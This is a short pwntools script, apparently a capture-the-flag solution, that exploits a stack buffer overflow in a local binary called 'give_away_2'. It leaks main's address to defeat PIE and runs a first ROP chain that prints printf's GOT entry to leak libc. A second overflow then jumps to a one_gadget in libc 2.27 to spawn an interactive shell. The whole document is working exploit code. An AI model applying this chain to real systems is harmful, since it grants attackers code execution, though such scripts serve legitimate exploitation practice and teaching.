from pwn import *

r=process("./give_away_2")
b=ELF('./give_away_2')
libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so') 

context.log_level='debug'

r.recvuntil(": ")
main=int(r.recvline().strip(),16)
base=main-b.symbols['main']
prdi=0x903+base
printf_got=b.got['printf']+base
printf=0x880+base

#rop one
pay=""
pay+='x'*0x20
pay+='x'*8
pay+=p64(prdi)
pay+=p64(printf_got)
pay+=p64(printf)

r.sendline(pay)
libc_base=u64(r.recv(6).ljust(8,'\x00'))-libc.symbols['printf']

#rop two

oneshot=0x4f322+libc_base

pay2=""
pay2+='x'*0x20
pay2+='x'*0x8
pay2+=p64(oneshot)

r.sendline(pay2)

r.interactive()

